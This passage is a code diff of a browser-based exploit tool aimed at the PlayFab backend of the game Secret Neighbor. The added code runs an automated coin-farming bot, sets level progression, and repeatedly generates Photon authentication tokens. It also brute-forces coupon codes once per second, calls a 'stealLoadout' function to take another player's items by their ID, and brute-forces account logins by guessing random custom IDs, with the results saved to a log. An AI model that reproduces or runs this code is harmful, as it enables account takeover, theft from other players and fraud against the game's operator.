           } else {
-            output += `✅ decideSpecialRole: Success\n`;
-            lastCoinFarmResponse = roleData.data;
-          }
-
-          if (matchId) {
-            // xpConsumed
-            const xpData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-              CustomTags: null,
-              FunctionName: "xpConsumed",
-              FunctionParameter: { token: matchId },
-              GeneratePlayStreamEvent: true,
-              RevisionSelection: null,
-              SpecificRevision: null,
-              AuthenticationContext: null
-            }, titleIdMain, sessionTicket);
-
-            if (xpData.error) {
-              output += `❌ xpConsumed: Error - ${xpData.error}\n`;
-            } else {
-              output += `✅ xpConsumed: Success\n`;
-              lastCoinFarmResponse = xpData.data;
-            }
-          }
-
-          // finishMatch
-          const finishData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-            FunctionName: "finishMatch",
-            FunctionParameter: { roomType, playerIds },
-            GeneratePlayStreamEvent: true
-          }, titleIdMain, sessionTicket);
-
-          if (finishData.error) {
-            output += `❌ finishMatch: Error - ${finishData.error}\n`;
-          } else {
-            output += `✅ finishMatch: Success\n`;
-            lastCoinFarmResponse = finishData.data;
-            let cycleCoins = 0;
-            if (finishData.data?.Logs) {
-              finishData.data.Logs.forEach(log => {
-                const match = log.Message.match(/Coins granted: (\d+)/);
-                if (match) {
-                  cycleCoins += parseInt(match[1], 10);
-                }
-              });
-            }
-            totalCoinsEarned += cycleCoins;
-            output += `💰 Coins Earned This Cycle: ${cycleCoins}\n`;
+            output += `✅ xpConsumed: Success\n`;
+            lastCoinFarmResponse = xpData.data;
           }
         }
+
+        await delay(1000);
+
+        // finishMatch
+        const finishData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+          FunctionName: "finishMatch",
+          FunctionParameter: { roomType, playerIds },
+          GeneratePlayStreamEvent: true
+        }, titleIdMain, sessionTicket);
+
+        if (finishData.error) {
+          output += `❌ finishMatch: Error - ${finishData.error}\n`;
+          throw new Error(`finishMatch failed: ${finishData.error}`);
+        } else {
+          output += `✅ finishMatch: Success\n`;
+          lastCoinFarmResponse = finishData.data;
+          let cycleCoins = 0;
+          if (finishData.data?.Logs) {
+            finishData.data.Logs.forEach(log => {
+              const match = log.Message.match(/Coins granted: (\d+)/);
+              if (match) {
+                cycleCoins += parseInt(match[1], 10);
+              }
+            });
+          }
+          totalCoinsEarned += cycleCoins;
+          output += `💰 Coins Earned This Cycle: ${cycleCoins}\n`;
+        }
+
+        cloudOutput.textContent += output;
+        cloudOutput.scrollTop = cloudOutput.scrollHeight;
       } catch (err) {
         output += `❌ Unexpected error: ${err.message}\n`;
+        cloudOutput.textContent += output;
+        cloudOutput.style.color = "red";
+        cloudOutput.scrollTop = cloudOutput.scrollHeight;
+        // Stop the bot on error to prevent getting stuck
+        clearInterval(coinFarmIntervalId);
+        coinFarmBotRunning = false;
+        document.getElementById("botStatus").className = "status-indicator status-inactive";
+        document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
       }
-
-      cloudOutput.textContent += output;
-      cloudOutput.scrollTop = cloudOutput.scrollHeight;
     }
 
     runCoinFarmCycle();
     coinFarmIntervalId = setInterval(runCoinFarmCycle, delayMs);
   }
 
-  // Enhanced makeApiCall to handle PlayFab-specific errors
-  async function makeApiCall(endpoint, method, body, titleId, sessionTicket = null) {
-    const headers = {
-      "Content-Type": "application/json"
-    };
-    if (sessionTicket) {
-      headers["X-Authorization"] = sessionTicket;
+  async function toggleLevelEditor() {
+    const output = document.getElementById("levelProgressionOutput");
+    if (levelEditorRunning) {
+      clearInterval(levelEditorIntervalId);
+      levelEditorRunning = false;
+      document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
+      document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
+      output.textContent += "\nLevel Editor stopped manually.\n";
+      output.scrollTop = output.scrollHeight;
+      return;
     }
 
+    const classId = document.getElementById("classIdInput").value.trim();
+    const receivedXP = parseInt(document.getElementById("receivedXPInput").value) || 0;
+    const jsonInput = document.getElementById("levelProgressionJson").value.trim();
+
+    if (!sessionTicket) {
+      output.textContent = "❌ Please set your SessionTicket first.\n";
+      output.style.color = "red";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    if (!jsonInput) {
+      output.textContent = "❌ Please provide JSON in level progression field.\n";
+      output.style.color = "red";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    let currentLevelProgression;
     try {
-      const res = await fetch(`https://${titleId}.playfabapi.com/${endpoint}`, {
-        method: method,
-        headers: headers,
-        body: JSON.stringify(body)
-      });
+      currentLevelProgression = JSON.parse(jsonInput);
+    } catch (e) {
+      output.textContent = "❌ Invalid JSON in level progression field.\n";
+      output.style.color = "red";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
 
-      const data = await res.json();
+    levelEditorRunning = true;
+    document.getElementById("levelEditorStatus").className = "status-indicator status-active";
+    document.getElementById("levelEditorToggleButton").textContent = "Stop Level Editor";
 
-      if (res.status === 429) {
-        return { error: "Rate limit exceeded. Please try again later." };
-      } else if (res.status === 401 || res.status === 403) {
-        return { error: "Invalid or expired SessionTicket. Please renew or set a new token." };
-      } else if (data.error) {
-        return { error: data.errorMessage || data.error };
+    output.textContent = `Starting Level Editor for class ${classId || "All"} with ${receivedXP} XP...\n`;
+
+    async function runLevelEditorCycle() {
+      try {
+        const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+          FunctionName: "setLevelProgressionForClass",
+          FunctionParameter: {
+            classId: classId || "All",
+            receivedXP,
+            currentLevelProgression: JSON.stringify(currentLevelProgression)
+          },
+          GeneratePlayStreamEvent: true
+        }, titleIdMain, sessionTicket);
+
+        if (data.error) {
+          output.textContent += `❌ Error: ${data.error}\n`;
+          throw new Error(`setLevelProgressionForClass failed: ${data.error}`);
+        } else {
+          output.textContent += `✅ Level progression updated successfully\n${formatResponse(data.data)}\n`;
+        }
+
+        output.scrollTop = output.scrollHeight;
+      } catch (err) {
+        output.textContent += `❌ Unexpected error: ${err.message}\n`;
+        output.style.color = "red";
+        output.scrollTop = output.scrollHeight;
+        // Stop the editor on error
+        clearInterval(levelEditorIntervalId);
+        levelEditorRunning = false;
+        document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
+        document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
+      }
+    }
+
+    runLevelEditorCycle();
+    levelEditorIntervalId = setInterval(runLevelEditorCycle, 60000); // Run every minute
+  }
+
+  async function togglePhotonTokenGenerator() {
+    const output = document.getElementById("photonTokenOutput");
+    if (photonTokenRunning) {
+      clearInterval(photonTokenIntervalId);
+      photonTokenRunning = false;
+      document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
+      document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
+      output.textContent += "\nPhoton Token Generator stopped manually.\n";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    if (!sessionTicket) {
+      output.textContent = "❌ Please set your SessionTicket first.\n";
+      output.style.color = "red";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    photonTokenRunning = true;
+    document.getElementById("photonTokenStatus").className = "status-indicator status-active";
+    document.getElementById("photonTokenToggleButton").textContent = "Stop Generating Photon Token";
+
+    output.textContent = "Starting Photon Token Generator...\n";
+
+    async function generatePhotonToken() {
+      try {
+        const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
+          PhotonApplicationId: "SecretNeighbor"
+        }, titleIdMain, sessionTicket);
+
+        if (data.error) {
+          output.textContent += `❌ Error: ${data.error}\n`;
+          throw new Error(`GetPhotonAuthenticationToken failed: ${data.error}`);
+        } else {
+          output.textContent += `✅ Photon Token: ${data.data.PhotonCustomAuthenticationToken}\n`;
+          totalTokensGenerated++;
+          output.textContent += `Total Tokens Generated: ${totalTokensGenerated}\n`;
+        }
+
+        output.scrollTop = output.scrollHeight;
+      } catch (err) {
+        output.textContent += `❌ Unexpected error: ${err.message}\n`;
+        output.style.color = "red";
+        output.scrollTop = output.scrollHeight;
+        // Stop the generator on error
+        clearInterval(photonTokenIntervalId);
+        photonTokenRunning = false;
+        document.getElementById("photonTokenStatus").className = "status-indicator status-inactive";
+        document.getElementById("photonTokenToggleButton").textContent = "Start Generating Photon Token";
+      }
+    }
+
+    generatePhotonToken();
+    photonTokenIntervalId = setInterval(generatePhotonToken, 30000); // Run every 30 seconds
+  }
+
+  async function toggleBruteforceRedeemCoupon() {
+    const output = document.getElementById("apiOutput");
+    if (couponBruteforceRunning) {
+      clearInterval(couponBruteforceIntervalId);
+      couponBruteforceRunning = false;
+      document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
+      document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
+      output.textContent += "\nCoupon Bruteforce stopped manually.\n";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    if (!sessionTicket) {
+      output.textContent = "❌ Please set your SessionTicket first.\n";
+      output.style.color = "red";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    couponBruteforceRunning = true;
+    document.getElementById("couponBruteforceStatus").className = "status-indicator status-active";
+    document.getElementById("couponBruteforceToggleButton").textContent = "Stop Bruteforce Redeem Coupon";
+
+    output.textContent = "Starting Coupon Bruteforce...\n";
+
+    async function attemptCouponRedeem() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      const couponLength = 10;
+      let couponCode = '';
+      for (let i = 0; i < couponLength; i++) {
+        couponCode += chars.charAt(Math.floor(Math.random() * chars.length));
       }
 
-      return data;
-    } catch (error) {
-      console.error(`API call failed for ${titleId}:`, error);
-      return { error: error.message };
+      try {
+        const data = await makeApiCall("Client/RedeemCoupon", "POST", {
+          CouponCode: couponCode
+        }, titleIdMain, sessionTicket);
+
+        attempts++;
+        output.textContent += `Attempt ${attempts}: Coupon ${couponCode} - `;
+        if (data.error) {
+          output.textContent += `Failed: ${data.error}\n`;
+          failedAttempts++;
+        } else {
+          output.textContent += `✅ Success! Coupon redeemed: ${JSON.stringify(data.data)}\n`;
+        }
+        output.textContent += `Total Attempts: ${attempts}, Failed: ${failedAttempts}\n`;
+        output.scrollTop = output.scrollHeight;
+      } catch (err) {
+        output.textContent += `Attempt ${attempts}: Coupon ${couponCode} - Error: ${err.message}\n`;
+        output.textContent += `Total Attempts: ${attempts}, Failed: ${failedAttempts}\n`;
+        output.style.color = "red";
+        output.scrollTop = output.scrollHeight;
+        // Stop on error
+        clearInterval(couponBruteforceIntervalId);
+        couponBruteforceRunning = false;
+        document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
+        document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
+      }
+    }
+
+    attemptCouponRedeem();
+    couponBruteforceIntervalId = setInterval(attemptCouponRedeem, 1000);
+  }
+
+  async function grantTrophy() {
+    const trophyId = document.getElementById("trophyId").value.trim();
+    const output = document.getElementById("apiOutput");
+
+    if (!trophyId) {
+      output.textContent = "❌ Please enter a Trophy ID.\n";
+      output.style.color = "red";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+      FunctionName: "grantTrophy",
+      FunctionParameter: { trophyId },
+      GeneratePlayStreamEvent: true
+    }, titleIdMain, sessionTicket);
+
+    if (data.error) {
+      output.textContent = `❌ Error: ${data.error}\n`;
+      output.style.color = "red";
+    } else {
+      output.textContent = `✅ Trophy granted successfully\n${formatResponse(data.data)}\n`;
+    }
+    output.scrollTop = output.scrollHeight;
+  }
+
+  async function resetLoadout() {
+    const output = document.getElementById("resetLoadoutOutput");
+    output.textContent = "Resetting loadout...\n";
+
+    const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+      FunctionName: "resetLoadout",
+      FunctionParameter: {},
+      GeneratePlayStreamEvent: true
+    }, titleIdMain, sessionTicket);
+
+    if (data.error) {
+      output.textContent = `❌ Error: ${data.error}\n`;
+      output.style.color = "red";
+    } else {
+      output.textContent = `✅ Loadout reset successfully\n${formatResponse(data.data)}\n`;
+    }
+    output.scrollTop = output.scrollHeight;
+  }
+
+  async function stealLoadout() {
+    const targetPlayFabId = document.getElementById("targetPlayFabId").value.trim();
+    const output = document.getElementById("stealLoadoutOutput");
+
+    if (!targetPlayFabId) {
+      output.textContent = "❌ Please enter a Target PlayFab ID.\n";
+      output.style.color = "red";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+      FunctionName: "stealLoadout",
+      FunctionParameter: { targetPlayFabId },
+      GeneratePlayStreamEvent: true
+    }, titleIdMain, sessionTicket);
+
+    if (data.error) {
+      output.textContent = `❌ Error: ${data.error}\n`;
+      output.style.color = "red";
+    } else {
+      output.textContent = `✅ Loadout stolen successfully\n${formatResponse(data.data)}\n`;
+    }
+    output.scrollTop = output.scrollHeight;
+  }
+
+  async function startBruteforce() {
+    const playFabUsername = document.getElementById("playFabUsername").value.trim();
+    const output = document.getElementById("bruteforceOutput");
+
+    if (!playFabUsername) {
+      output.textContent = "❌ Please enter a PlayFab ID.\n";
+      output.style.color = "red";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    if (bruteforceRunning) {
+      output.textContent += "Bruteforce is already running.\n";
+      output.scrollTop = output.scrollHeight;
+      return;
+    }
+
+    bruteforceRunning = true;
+    output.textContent = "Starting Photon Token Bruteforce...\n";
+
+    async function attemptBruteforce() {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      const tokenLength = 20;
+      let token = '';
+      for (let i = 0; i < tokenLength; i++) {
+        token += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+
+      try {
+        const data = await makeApiCall("Client/LoginWithCustomID", "POST", {
+          CustomId: token,
+          CreateAccount: false
+        }, titleIdMain);
+
+        bruteforceLog.push({
+          timestamp: new Date().toISOString(),
+          token,
+          success: !data.error,
+          error: data.error || null
+        });
+
+        output.textContent += `Attempt for ${playFabUsername} with token ${token}: `;
+        if (data.error) {
+          output.textContent += `Failed - ${data.error}\n`;
+        } else {
+          output.textContent += `✅ Success! Logged in with token ${token}\n`;
+          bruteforceRunning = false;
+          clearInterval(bruteforceIntervalId);
+          document.getElementById("bruteforceOutput").textContent += "Bruteforce stopped due to successful login.\n";
+          downloadLogAsJSON(bruteforceLog, "bruteforce_log");
+          bruteforceLog.length = 0;
+        }
+        output.scrollTop = output.scrollHeight;
+      } catch (err) {
+        bruteforceLog.push({
+          timestamp: new Date().toISOString(),
+          token,
+          success: false,
+          error: err.message
+        });
+        output.textContent += `Attempt for ${playFabUsername} with token ${token}: Error - ${err.message}\n`;
+        output.scrollTop = output.scrollHeight;
+      }
+    }
+
+    attemptBruteforce();
+    bruteforceIntervalId = setInterval(attemptBruteforce, 1000);
+  }
+
+  async function stopBruteforce() {
+    if (bruteforceRunning) {
+      clearInterval(bruteforceIntervalId);
+      bruteforceRunning = false;
+      const output = document.getElementById("bruteforceOutput");
+      output.textContent += "Bruteforce stopped manually.\n";
+      downloadLogAsJSON(bruteforceLog, "bruteforce_log");
+      bruteforceLog.length = 0;
+      output.scrollTop = output.scrollHeight;
     }
   }
 
-  // ... (all other functions from your original code remain unchanged, e.g., setSessionTicket, renewSessionTicket, etc.)
-
-  // Initialize saved session tickets on page load
-  document.addEventListener("DOMContentLoaded", function() {
-    console.log("Secret Neighbor Exploits page loaded");
-    const savedTicket = localStorage.getItem('sessionTicket');
-    if (savedTicket) {
-      sessionTicket = savedTicket;
-      document.getElementById("sessionTicketInput").value = savedTicket;
-      const tokenStatus = document.getElementById("tokenStatus");
-      tokenStatus.textContent = "✅ Token loaded from storage!";
-      tokenStatus.style.display = "block";
-      tokenStatus.style.color = "green";
-      fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus, "STEAM");
-    }
-    const savedTicketIOS = localStorage.getItem('sessionTicketIOS');
-    if (savedTicketIOS) {
-      sessionTicketIOS = savedTicketIOS;
-      document.getElementById("sessionTicketInputIOS").value = savedTicketIOS;
-      const tokenStatusIOS = document.getElementById("tokenStatusIOS");
-      tokenStatusIOS.textContent = "✅ Token loaded from storage!";
-      tokenStatusIOS.style.display = "block";
-      tokenStatusIOS.style.color = "green";
-      fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatusIOS, "IOS");
-    }
-  });
+  // Initialize session tickets from localStorage
+  if (localStorage.getItem('sessionTicket')) {
+    sessionTicket = localStorage.getItem('sessionTicket');
+    document.getElementById("sessionTicketInput").value = sessionTicket;
+    fetchPlayerInfo03(titleIdMain, sessionTicket, document.getElementById("tokenStatus"), "STEAM");
+  }
+  if (localStorage.getItem('sessionTicketIOS')) {
+    sessionTicketIOS = localStorage.getItem('sessionTicketIOS');
+    document.getElementById("sessionTicketInputIOS").value = sessionTicketIOS;
+    fetchPlayerInfo03(titleIdIOS, sessionTicketIOS, document.getElementById("tokenStatusIOS"), "IOS");
+  }
 </script>
